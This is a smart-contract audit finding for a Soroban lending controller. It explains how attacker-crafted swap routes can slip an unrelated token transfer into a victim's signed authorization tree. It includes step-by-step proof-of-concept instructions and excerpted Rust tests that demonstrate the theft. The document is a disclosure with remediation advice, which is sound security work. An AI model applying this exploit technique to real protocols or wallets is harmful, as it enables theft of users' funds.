### Title
Caller-selected route execution can smuggle an unrelated token transfer into the caller’s signed authorization tree - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary

`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` all accept attacker-controlled route bytes and forward them to the configured swap router. The controller bounds only the router’s use of the swapped input and output; it does not prevent route-selected pool code from running beneath the caller’s root authorization. If that code requests an unrelated `token.transfer(caller, attacker, amount)`, Soroban records the request as a child of the caller’s authorization, and it succeeds if the wallet signs the simulated tree without inspecting the extra child.

### Finding Description

The strategy entrypoint requires authorization from the account owner or delegate before withdrawing collateral or restructuring debt. For a routed conversion, `swap_tokens` obtains the configured router, authorizes exactly one controller-to-router input transfer, and invokes `router.execute_strategy(&controller, amount_in, swap)` with caller-provided route bytes.

The controller then verifies that the router did not spend more than the supplied input and that the expected output token balance increased, but these checks cover only the two market tokens passed to the strategy. They do not constrain arbitrary contract code reached through the route’s pool addresses.

This maps the file-inclusion traversal class to contract dispatch: a route component acts like a caller-selected resource name, and resolving it without a venue/pool allowlist can escape the intended resource boundary into attacker-controlled code. The dangerous consequence is not merely a bad exchange rate. During simulation, a nested `token.transfer` from the account owner can be attached as an additional authorization child. A client that signs that returned tree authorizes movement of wallet assets unrelated to the lending operation. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation

A malicious route can cause loss of unrelated wallet tokens in addition to the routed collateral. The protocol’s post-call balance checks remain satisfied because the rogue transfer moves a third token directly from the caller to the attacker, outside the controller’s measured input and output pair. The swap can still return a valid output amount, leaving the position solvent and the transaction apparently successful.

The accepted impact is theft of user funds. The loss is bounded by what the victim signs in the poisoned authorization tree, but it is not bounded by `amount`, route output, or the lending account’s collateral.

### Likelihood Explanation

The attack requires a victim to submit a malicious route and sign the authorization tree containing the rogue child transfer. An honest route produces no extra child authorization, while an unsafe signing flow that simply adopts simulation output can expose the child without making its economic effect obvious. The contract’s own threat model and test harness demonstrate that a route-selected pool can add a caller-funded transfer beneath `swap_collateral`, that enforcing auth rejects it under an honest tree, and that it succeeds when the simulated poisoned tree is signed. [4](#0-3) [5](#0-4) 

### Recommendation

Do not rely only on measured input/output settlement for route safety.

- Restrict route execution to governance-approved venue and pool addresses.
- Alternatively, have the router enforce a decoded allowlist before dispatch and expose a way for clients to prove that every callee in the route is expected.
- Ensure controller-facing clients and SDKs reject any authorization tree containing children other than the exact expected token pull.
- Document that accepting a simulated authorization tree wholesale is unsafe, and add transaction-building checks that compare every recorded child invocation against the route’s declared calls.
- Prefer an authorization shape in which route-descendant token transfers cannot be attached to the account owner’s root authorization.

### Proof of Concept

1. The attacker deploys a contract exposing the pool function expected by the selected venue adapter.
2. The attacker crafts route bytes naming that contract as a hop pool.
3. The rogue pool performs the expected swap behavior and additionally calls:
   `token.transfer(victim, attacker, wallet_balance)`
   for a token unrelated to the swap.
4. The victim calls `Controller::swap_collateral(caller, account_id, current, amount, new, route)`.
5. `swap_tokens` authorizes the expected controller-to-router transfer and invokes the configured router.
6. The router reaches the rogue pool. During simulation, the unrelated transfer is recorded as a child beneath the victim’s `swap_collateral` authorization.
7. If the victim signs that tree, the host accepts the child transfer: the victim receives valid swap output while the attacker receives the unrelated wallet token.
8. The controller’s post-checks still pass because they inspect only `token_in` and `token_out`; they do not observe the third token’s victim balance.

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
